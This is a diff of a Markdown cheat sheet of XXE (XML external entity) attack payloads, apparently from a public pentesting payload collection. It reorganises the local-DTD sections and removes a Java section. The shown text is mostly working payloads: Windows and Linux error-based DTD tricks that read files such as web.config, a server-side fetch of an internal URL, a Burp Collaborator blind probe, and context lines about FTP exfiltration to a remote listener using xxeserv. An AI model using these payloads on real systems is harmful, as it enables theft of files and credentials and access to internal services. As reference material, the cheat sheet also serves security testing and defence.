@@ -19,24 +19,23 @@
     - [Parameters Laugh Attack](#parameters-laugh-attack)
 - [Exploiting Error Based XXE](#exploiting-error-based-xxe)
     - [Error Based - Using Local DTD File](#error-based---using-local-dtd-file)
+        - [Linux Local DTD](#linux-local-dtd)
+        - [Windows Local DTD](#windows-local-dtd)
     - [Error Based - Using Remote DTD](#error-based---using-remote-dtd)
 - [Exploiting Blind XXE to Exfiltrate Data Out Of Band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
     - [Blind XXE](#blind-xxe)
     - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
     - [XXE OOB with DTD and PHP Filter](#xxe-oob-with-dtd-and-php-filter)
     - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)
-- [XXE with Local DTD](#xxe-with-local-dtd)
 - [WAF Bypasses](#waf-bypasses)
    - [Bypass via Character Encoding](#bypass-via-character-encoding)
    - [XXE on JSON Endpoints](#xxe-on-json-endpoints)
-- [XXE in Java](#xxe-in-java)
 - [XXE in Exotic Files](#xxe-in-exotic-files)
     - [XXE Inside SVG](#xxe-inside-svg)
     - [XXE Inside SOAP](#xxe-inside-soap)
     - [XXE Inside DOCX file](#xxe-inside-docx-file)
     - [XXE Inside XLSX file](#xxe-inside-xlsx-file)
     - [XXE Inside DTD file](#xxe-inside-dtd-file)
-- [Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents](#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents)
 - [Labs](#labs)
 - [References](#references)
 
@@ -217,7 +216,22 @@ A variant of the Billion Laughs attack, using delayed interpretation of paramete
 
 ### Error Based - Using Local DTD File
 
-Short list of dtd files already stored on Linux systems; list them with `locate .dtd`:
+If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.
+
+```xml
+<!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
+    %local_dtd;
+]>
+<root></root>
+```
+
+* [GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) - List DTDs and generate XXE payloads using those local DTDs.
+
+
+#### Linux Local DTD
+
+Short list of DTD files already stored on Linux systems; list them with `locate .dtd`:
 
 ```xml
 /usr/share/xml/fontconfig/fonts.dtd
@@ -244,6 +258,42 @@ The final payload becomes:
 ]>
 <message>Text</message>
 ```
+
+#### Windows Local DTD
+
+Payloads from [infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79).
+
+* Disclose local file
+
+  ```xml
+  <!DOCTYPE doc [
+      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+      <!ENTITY % SuperClass '>
+          <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
+          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
+          &#x25;eval;
+          &#x25;error;
+        <!ENTITY test "test"'
+      >
+      %local_dtd;
+    ]><xxx>anything</xxx>
+  ```
+
+* Disclose HTTP Response
+
+  ```xml
+  <!DOCTYPE doc [
+      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+      <!ENTITY % SuperClass '>
+          <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
+          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
+          &#x25;eval;
+          &#x25;error;
+        <!ENTITY test "test"'
+      >
+      %local_dtd;
+    ]><xxx>anything</xxx>
+  ```
 
 
 ### Error Based - Using Remote DTD
@@ -307,6 +357,12 @@ The easiest way to test for a blind XXE is to try to load a remote resource such
 ]>
 <r></r>
 ```
+
+```xml
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>]>
+<root>&test;</root>
+```
+
 
 Send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.
 
@@ -373,63 +429,6 @@ Send the XML file to the `deploy` folder.
 Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
 
 
-## XXE with Local DTD
-
-In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:
-```xml
-<!DOCTYPE root [<!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'>]>
-<root>&test;</root>
-```
-
-If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.
-
-```xml
-<!DOCTYPE root [
-    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
-
-    %local_dtd;
-]>
-<root></root>
-```
-
-Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.
-
-```xml
-<!DOCTYPE root [
-    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-
-    <!ENTITY % ISOamsa '
-        <!ENTITY &#x25; file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        '>
-
-    %local_dtd;
-]>
-<root></root>
-```
-
-### Cisco WebEx
-
-```xml
-<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
-<!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test "test"'>
-%local_dtd;
-```
-
-### Citrix XenMobile Server
-
-```xml
-<!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
-<!ENTITY % Body '>Your DTD code<!ENTITY test "test"'>
-%local_dtd;
-```
-
-* [GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) - List DTDs and generate XXE payloads using those local DTDs.
-
-
-
 ## WAF Bypasses
 
 ### Bypass via Character Encoding
@@ -479,28 +478,6 @@ In the HTTP request try to switch the `Content-Type` from **JSON** to **XML**,
 ```
 
 * [NetSPI/Content-Type Converter](https://github.com/NetSPI/Burp-Extensions/releases/tag/1.4)
-
-
-## XXE in Java
-
-Insecure configuration in 10 different Java classes from three XML processing interfaces (DOM, SAX, StAX) that can lead to XXE:
-
-![XXE Java security features overview infographics](https://semgrep.dev/docs/assets/images/cheat-sheets-xxe-java-infographics-1d1d5016802e3ab8f0886b62b8c81f21.png)
-
-- [DocumentBuilderFactory (javax.xml.parsers.DocumentBuilderFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3a-documentbuilderfactory)
-- [SAXBuilder (org.jdom2.input.SAXBuilder)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3b-saxbuilder)
-- [SAXParserFactory (javax.xml.parsers.SAXParserFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3c-saxparserfactory)
-- [SAXParser (javax.xml.parsers.SAXParser )](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3d-saxparser)
-- [SAXReader (org.dom4j.io.SAXReader)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3e-saxreader)
-- [TransformerFactory (javax.xml.transform.TransformerFactory) & SAXTransformerFactory (javax.xml.transform.sax.SAXTransformerFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3f-transformerfactory--saxtransformerfactory)
-- [SchemaFactory (javax.xml.validation.SchemaFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3g-schemafactory)
-- [Validator (javax.xml.validation.Validator)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3h-validator)
-- [XMLReader (org.xml.sax.XMLReader)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3i-xmlreader)
-
-Ref.
-
-- [Semgrep - XML Security in Java](https://semgrep.dev/blog/2022/xml-security-in-java)
-- [Semgrep - XML External entity prevention for Java](https://semgrep.dev/docs/cheat-sheets/java-xxe/)
 
 
 ## XXE in Exotic Files
@@ -652,7 +629,7 @@ And using FTP instead of HTTP allows to retrieve much larger files.
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
 ```
 
-Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
+Serve DTD and receive FTP payload using [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv):
 
 ```
 $ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
@@ -673,42 +650,6 @@ When all you control is the DTD file, and you do not control the `xml` file, XXE
 %external;
 ```
 
-
-## Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
-
-From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
-
-### Disclose local file
-
-```xml
-<!DOCTYPE doc [
-    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
-    <!ENTITY % SuperClass '>
-        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-      <!ENTITY test "test"'
-    >
-    %local_dtd;
-  ]><xxx>cacat</xxx>
-```
-
-### Disclose HTTP Response:
-
-```xml
-<!DOCTYPE doc [
-    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
-    <!ENTITY % SuperClass '>
-        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-      <!ENTITY test "test"'
-    >
-    %local_dtd;
-  ]><xxx>cacat</xxx>
-```
 
 ## Labs
 
